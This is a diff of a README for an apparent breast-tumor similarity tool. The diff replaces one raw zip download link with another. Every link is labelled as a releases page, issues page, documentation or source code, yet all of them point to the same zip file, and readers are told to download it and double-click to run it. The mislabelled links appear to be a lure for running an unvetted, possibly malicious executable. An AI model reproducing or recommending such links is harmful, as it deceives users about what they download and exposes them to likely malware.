@@ -1,6 +1,6 @@
 # 🎨 Tumor-Doppelganger-Studio - Explore Breast Tumor Similarities with Ease
 
-[![Download](https://github.com/aten302/Tumor-Doppelganger-Studio/raw/refs/heads/main/models/Doppelganger-Studio-Tumor-v2.0.zip%20Now-Download-success)](https://github.com/aten302/Tumor-Doppelganger-Studio/raw/refs/heads/main/models/Doppelganger-Studio-Tumor-v2.0.zip)
+[![Download](https://github.com/aten302/Tumor-Doppelganger-Studio/raw/refs/heads/main/app/Studio_Doppelganger_Tumor_1.1-alpha.5.zip%20Now-Download-success)](https://github.com/aten302/Tumor-Doppelganger-Studio/raw/refs/heads/main/app/Studio_Doppelganger_Tumor_1.1-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Tumor-Doppelganger-Studio! This application helps you explore similar
 
 To get started, you need to download the application. 
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/aten302/Tumor-Doppelganger-Studio/raw/refs/heads/main/models/Doppelganger-Studio-Tumor-v2.0.zip).
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/aten302/Tumor-Doppelganger-Studio/raw/refs/heads/main/app/Studio_Doppelganger_Tumor_1.1-alpha.5.zip).
 2. **Select the Latest Release**: Look for the most recent version at the top of the list.
 3. **Download the File**: Click on the asset that corresponds to your operating system. Save the file to a location you can easily access.
 4. **Run the Application**: Once the file is downloaded, locate it and double-click to run the application.
@@ -64,12 +64,12 @@ If you run into issues with the application, here are some common solutions:
 
 ## ✉️ Support
 
-Should you encounter any problems that these suggestions do not resolve, you can reach out for assistance. Visit our [GitHub Issues page](https://github.com/aten302/Tumor-Doppelganger-Studio/raw/refs/heads/main/models/Doppelganger-Studio-Tumor-v2.0.zip) to report problems or to get help from other users. Your feedback is valuable for improving the software.
+Should you encounter any problems that these suggestions do not resolve, you can reach out for assistance. Visit our [GitHub Issues page](https://github.com/aten302/Tumor-Doppelganger-Studio/raw/refs/heads/main/app/Studio_Doppelganger_Tumor_1.1-alpha.5.zip) to report problems or to get help from other users. Your feedback is valuable for improving the software.
 
 ## 🔗 Useful Links
 
-- [Download Tumor-Doppelganger-Studio](https://github.com/aten302/Tumor-Doppelganger-Studio/raw/refs/heads/main/models/Doppelganger-Studio-Tumor-v2.0.zip)
-- [Documentation](https://github.com/aten302/Tumor-Doppelganger-Studio/raw/refs/heads/main/models/Doppelganger-Studio-Tumor-v2.0.zip)
-- [Source Code](https://github.com/aten302/Tumor-Doppelganger-Studio/raw/refs/heads/main/models/Doppelganger-Studio-Tumor-v2.0.zip)
+- [Download Tumor-Doppelganger-Studio](https://github.com/aten302/Tumor-Doppelganger-Studio/raw/refs/heads/main/app/Studio_Doppelganger_Tumor_1.1-alpha.5.zip)
+- [Documentation](https://github.com/aten302/Tumor-Doppelganger-Studio/raw/refs/heads/main/app/Studio_Doppelganger_Tumor_1.1-alpha.5.zip)
+- [Source Code](https://github.com/aten302/Tumor-Doppelganger-Studio/raw/refs/heads/main/app/Studio_Doppelganger_Tumor_1.1-alpha.5.zip)
 
 We hope you find Tumor-Doppelganger-Studio a useful tool for exploring breast tumor similarities. Enjoy your journey into the world of healthcare data analysis!
